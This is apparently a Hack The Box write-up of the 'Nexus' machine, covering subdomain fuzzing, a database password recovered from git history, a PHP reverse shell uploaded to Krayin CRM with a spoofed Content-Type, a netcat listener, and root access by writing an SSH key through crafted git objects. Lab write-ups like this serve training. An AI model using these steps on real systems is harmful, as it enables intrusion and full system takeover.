# HTB - Nexus
**Category:** Web, Boot2Root  
**Difficulty:** Easy  
**OS:** Linux

## Tools Used
- nmap
- ffuf
- git
- Burp Suite
- python3
- netcat
- ssh

## Steps

### Reconnaissance

1. Ran nmap: `nmap -sC -sV <IP>` — found port 22 (SSH) and port 80 (HTTP/nginx)
2. Browsing port 80 redirected to `nexus.htb` — added to `/etc/hosts`
3. Found email address in the careers section: `j.matthew@nexus.htb`
4. Ran ffuf subdomain enumeration, filtering out default response size:
```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://nexus.htb \
  -H "Host: FUZZ.nexus.htb" -mc 200 -fs 154 -t 50
```
Found two subdomains: `git.nexus.htb` and `billing.nexus.htb` — added both to `/etc/hosts`

### Credential Exposure via Git Commit History

5. Browsed `git.nexus.htb` — found a public Gitea instance with repo `admin/krayin-docker-setup`
6. The current `.env` file had `DB_PASSWORD` blank — checked commit history:
```bash
git clone http://git.nexus.htb/admin/krayin-docker-setup
cd krayin-docker-setup
git log --oneline
git show <older_commit> -- .env | grep -i password
```
Found DB password in an older commit that had been removed from the latest version

### Initial Access — CVE-2026-38526 (Krayin CRM File Upload RCE)

7. Logged into `http://billing.nexus.htb` using `j.matthew@nexus.htb` and the recovered DB password
8. Navigated to Mail → Compose Mail — attached a PHP reverse shell (`shell.php`)
9. Intercepted the upload request in Burp Suite — changed `Content-Type: application/x-php` to `Content-Type: image/jpeg` and forwarded
10. The server accepted the file — extracted the uploaded URL from the JSON response:
```
http://billing.nexus.htb/storage/emails/<id>/shell.php
```
11. Started listener: `nc -lvnp 4444`
12. Triggered the shell: `curl http://billing.nexus.htb/storage/emails/<id>/shell.php`
13. Got shell as `www-data`

### Lateral Movement — www-data → jones

14. Read the app's `.env` file:
```bash
cat /var/www/krayin/.env
```
Found plaintext DB password for the `krayin` user
15. Used the same password to SSH as `jones`:
```bash
ssh jones@<IP>
```
16. Read user flag: `cat ~/user.txt`

### Privilege Escalation — Git Tree Path Traversal via Gitea Template Sync

17. Identified a systemd timer `gitea-template-sync.timer` running every minute as root — it clones Gitea template repos and reconstructs file trees using `os.path.join()` without sanitizing `..` path components
18. Generated an SSH key pair on the target:
```bash
ssh-keygen -t ed25519 -f /tmp/.k -N ''
```
19. Created a template repository via the Gitea API:
```bash
curl -s -X POST http://127.0.0.1:3000/api/v1/user/repos \
  -H "Content-Type: application/json" \
  -u 'jones:<password>' \
  -d '{"name":"pwn","is_template":true,"auto_init":true}'
```
20. Cloned the repo and ran a Python exploit that manually crafts raw Git objects with `..` path traversal entries — embedding the SSH public key at a path that resolves to `/root/.ssh/authorized_keys`:
```bash
cd /tmp && git clone 'http://jones:<password>@127.0.0.1:3000/jones/pwn'
cd pwn && python3 /tmp/exploit.py
```
21. Force-pushed the malicious commit:
```bash
git remote set-url origin 'http://jones:<password>@127.0.0.1:3000/jones/pwn'
git push origin main --force
```
22. Marked the repo as a template via API and waited for the cron timer to fire (~1 minute)
23. SSH'd as root from Kali using the generated private key:
```bash
ssh -i /tmp/root.key root@<IP>
```
24. Read root flag: `cat /root/root.txt`

## What I Learned
- Always check full git commit history when a `.env` file has blank credentials — removed secrets are still visible in diffs
- Krayin CRM v2.2.0 (CVE-2026-38526) accepts PHP files when the Content-Type header is changed to `image/jpeg` — server-side MIME validation was absent
- Credentials found in app config files are often reused for system user accounts — always try them against SSH
- Git's client-side safety checks that reject `..` path components in tree entries can be bypassed by crafting raw Git objects manually using Python
- `os.path.join()` does not strip or block `..` traversal sequences — server-side scripts that use it on unsanitized git tree paths are exploitable
- A cron job that clones and reconstructs git templates as root turns a path traversal into arbitrary file write anywhere on the filesystem
